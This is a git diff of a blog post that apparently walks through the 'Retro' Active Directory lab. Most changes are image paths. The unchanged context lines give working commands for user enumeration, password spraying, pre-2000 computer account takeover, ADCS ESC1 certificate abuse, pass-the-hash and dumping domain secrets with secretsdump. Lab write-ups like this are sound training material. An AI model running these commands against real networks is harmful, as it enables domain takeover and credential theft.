@@ -29,7 +29,7 @@ These two components are common in enterprise environments, and misconfiguration
 {: .prompt-tip }
 
 ### Understanding the Concepts
-Before jumping into the exploitation phase, let’s break down the two main concepts this lab focuses on — `Access Control Lists (ACLs)` and `Group Policy Objects (GPOs)` in a beginner-friendly way.
+Before jumping into the exploitation phase, let’s break down the two main concepts this lab focuses on `Pre-Created Computer Accounts` and `Active Directory Certificate Services (ADCS)` in a beginner-friendly way.
 
 **Access Control Lists (ACLs)**
 > An `Access Control List (ACL)` in Active Directory is essentially a set of permissions attached to an object, think of it as a list of `who can do what`. For example, imagine a shared folder in an office: 
@@ -124,11 +124,11 @@ Guest access
 nxc smb 10.10.79.94 -u 'Guest' -p '' --shares
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%201.png)
+![alt text](/assets/screenshots/Retro/1.png)
 
 Access share with read permission
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%202.png)
+![alt text](/assets/screenshots/Retro/2.png)
 
 users enumeration
 
@@ -136,7 +136,7 @@ users enumeration
 kerbrute userenum  -d retro.vl  --dc 10.10.79.94  -t 100 wordlists/userslist.txt
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%203.png)
+![alt text](/assets/screenshots/Retro/3.png)
 
 got a hit using netxec username as password
 
@@ -144,7 +144,7 @@ got a hit using netxec username as password
 nxc smb 10.10.79.94 -u loots/users.txt -p loots/users.txt  --no-bruteforce --continue-on-success
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%204.png)
+![alt text](/assets/screenshots/Retro/4.png)
 
 Enumerating users
 
@@ -152,7 +152,7 @@ Enumerating users
 nxc smb 10.10.79.94 -u trainee -p trainee --users
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%205.png)
+![alt text](/assets/screenshots/Retro/5.png)
 
 After having a list of users we could have trained AS-REP Roasting and Kerberoasting but both of dindt work here
 
@@ -168,7 +168,7 @@ AS-REP Roasting
 GetNPUsers.py retro.vl/trainee:trainee -usersfile loots/users.txt  -dc-ip 10.10.79.94
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%206.png)
+![alt text](/assets/screenshots/Retro/6.png)
 
 Enumerating Shares
 
@@ -176,7 +176,7 @@ Enumerating Shares
 nxc smb 10.10.79.94 -u trainee -p trainee --shares
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%207.png)
+![alt text](/assets/screenshots/Retro/7.png)
 
 Hinting about pre created computer account
 
@@ -184,7 +184,7 @@ Hinting about pre created computer account
 smbclient -U trainee //10.10.79.94/Notes
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%208.png)
+![alt text](/assets/screenshots/Retro/8.png)
 
 Abusing Weak AD Permision Pre2K Compatibility
 
@@ -194,7 +194,7 @@ Using netexec
 nxc ldap 10.10.79.94 -u trainee -p trainee -M pre2k
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%209.png)
+![alt text](/assets/screenshots/Retro/9.png)
 
 using the ccache
 
@@ -202,7 +202,7 @@ using the ccache
 export KRB5CCNAME=loots/tickets/banking.ccache
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2010.png)
+![alt text](/assets/screenshots/Retro/10.png)
 
 Confirm
 
@@ -210,7 +210,7 @@ Confirm
 nxc smb 10.10.79.94 --use-kcache
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2011.png)
+![alt text](/assets/screenshots/Retro/11.png)
 
 Also Changing Password
 
@@ -218,7 +218,7 @@ Also Changing Password
 nxc smb 10.10.79.94 -u "BANKING$" -p banking
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2012.png)
+![alt text](/assets/screenshots/Retro/12.png)
 
 change
 
@@ -226,7 +226,7 @@ change
 changepasswd.py retro.vl/BANKING\$@10.10.79.94 -newpass 'Password123!' -p rpc-samr
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2013.png)
+![alt text](/assets/screenshots/Retro/13.png)
 
 Confirm
 
@@ -234,7 +234,7 @@ Confirm
 nxc smb 10.10.79.94 -u "BANKING$" -p 'Password123!'
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2014.png)
+![alt text](/assets/screenshots/Retro/14.png)
 
 ADCS
 
@@ -242,7 +242,7 @@ ADCS
 nxc ldap 10.10.79.94 --use-kcache -M adcs
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2015.png)
+![alt text](/assets/screenshots/Retro/15.png)
 
 Using Certipy
 
@@ -250,7 +250,7 @@ Using Certipy
 certipy find -u 'BANKING$' -p 'Password123!' -dc-ip "10.10.79.94" -debug
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2016.png)
+![alt text](/assets/screenshots/Retro/16.png)
 
 Find Vulnerable Templates
 
@@ -258,9 +258,9 @@ Find Vulnerable Templates
 certipy find -u 'BANKING$' -p 'Password123!' -dc-ip "10.10.79.94" -stdout -vulnerable
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2017.png)
+![alt text](/assets/screenshots/Retro/17.png)
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2018.png)
+![alt text](/assets/screenshots/Retro/18.png)
 
 ## Initial access
 
@@ -270,9 +270,9 @@ Exploting ESC1
 certipy req -u 'BANKING$' -p 'Password123!' -dc-ip '10.10.79.94' -ca 'retro-DC-CA' -template 'RetroClients' -dns 'DC.retro.vl' -key-size 4096 -debug
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2019.png)
+![alt text](/assets/screenshots/Retro/19.png)
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2020.png)
+![alt text](/assets/screenshots/Retro/20.png)
 
 Confirm
 
@@ -280,7 +280,7 @@ Confirm
 nxc smb 10.10.79.94 -u 'DC$' -H 532f3be569a64881ec82f1cc875059e3
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2021.png)
+![alt text](/assets/screenshots/Retro/22.png)
 
 or we can request directly administartor
 
@@ -296,7 +296,7 @@ dumped the secrets
 secretsdump.py retro.vl/'DC$'@10.10.79.94 -hashes aad3b435b51404eeaad3b435b51404ee:532f3be569a64881ec82f1cc875059e3
 ```
 
-![image.png](Retro%201d43d2c489f680c983dfcfa3eeff9a5a/image%2022.png)
+![alt text](/assets/screenshots/Retro/23.png)
 
 ## References
 
